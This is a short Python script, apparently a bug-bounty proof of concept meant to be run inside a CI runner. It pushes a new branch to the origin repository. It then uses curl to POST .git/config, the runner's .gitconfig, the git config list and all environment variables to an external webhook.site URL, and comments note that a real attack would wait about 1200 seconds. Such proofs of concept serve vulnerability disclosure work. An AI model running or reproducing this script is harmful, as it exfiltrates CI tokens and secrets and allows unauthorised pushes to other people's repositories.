#!/usr/bin/env python
#name run.py
import os

def main():
  print("----hello from file-----")

  os.system("""
  echo "-------------poc_hello--------------" >&2

  git config --list >&2

  echo "--- creating malicious branch, can easily push to master or release ---" >&2 
  git config --global user.email "bh@someemail.com"
  git config --global user.name "H1Tester"
  git fetch origin >&2
  git checkout master >&2
  git pull origin master >&2
  git checkout -b bh-poc >&2
  git add . >&2
  git push -u origin bh-poc >&2

  echo "--- token extraction ---" >&2 

  export webhook="https://https://webhook.site/7a74c235-2eda-482d-80fd-473c9c066cc4"

  curl -X POST \
    -H "Content-Type: text/plain" \
    --data "$(cat .git/config)" \
      "$webhook/git_config"

  curl -X POST \
    -H "Content-Type: text/plain" \
    --data "$(git config --list)" \
      "$webhook/git_config_list"


  curl -X POST \
    -H "Content-Type: text/plain" \
    --data "$(cat /home/runner/.gitconfig)" \
      "$webhook/home_runner_gitconfig"


  curl -X POST \
    -H "Content-Type: text/plain" \
    --data "$(printenv)" \
    "$webhook/printenv"


  echo "--- sleeping (in real attack use longer time) ---" >&2
  sleep 2 # in real attack it will be 1200 to have time to edit 

  """)
